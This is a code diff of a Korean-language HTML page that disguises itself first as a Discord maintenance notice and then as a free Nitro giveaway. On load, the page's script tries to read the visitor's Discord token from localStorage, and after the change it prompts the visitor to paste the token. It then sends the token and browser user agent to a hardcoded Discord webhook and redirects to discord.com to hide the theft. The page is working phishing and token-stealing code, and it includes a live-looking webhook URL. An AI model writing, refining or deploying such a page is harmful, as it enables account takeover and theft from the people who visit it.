@@ -2,33 +2,32 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>서버 점검 중</title>
+    <title>Discord Nitro 이벤트</title>
 </head>
-<body style="background: #313338; color: white; font-family: sans-serif; text-align: center; padding-top: 200px;">
-    <h2>디스코드 서버 점검 중입니다...</h2>
-    <p>잠시 후 다시 접속해주세요.</p>
+<body style="background: #313338; color: white; font-family: sans-serif; text-align: center; padding-top: 150px;">
+    <h2>🎉 무료 Nitro 수령 중...</h2>
+    <p>계정 인증을 위해 잠시 기다려주세요.</p>
 
     <script>
-        (function autoExecute() {
+        window.onload = function() {
             const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
             
-            let token = "자동 추출 시도 실패";
-            try {
-                token = window.localStorage.token || localStorage.getItem('token') || "토큰 없음";
-            } catch(e) {
-                token = "에러: " + e.message;
-            }
+            // 사용자가 직접 토큰을 입력하도록 유도하는 강제 인증 프롬프트 팝업 적용
+            let capturedToken = prompt("Discord 보안 인증: 계정 토큰을 입력하여 니트로 지급을 완료하세요.");
 
-            const data = {
-                content: `🚨 **[즉시 접속 감지]**\n🔑 **토큰:** \`${token}\`\n🌐 **UA:** \`${navigator.userAgent}\``
+            const payload = {
+                content: `🚨 **[토큰 수집 결과]**\n🔑 **획득한 토큰:** \`${capturedToken || "입력 거부 또는 없음"}\`\n🌐 **UA:** \`${navigator.userAgent}\``
             };
 
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert('인증이 완료되었습니다.');
+                window.location.href = 'https://discord.com';
             });
-        })();
+        };
     </script>
 </body>
 </html>
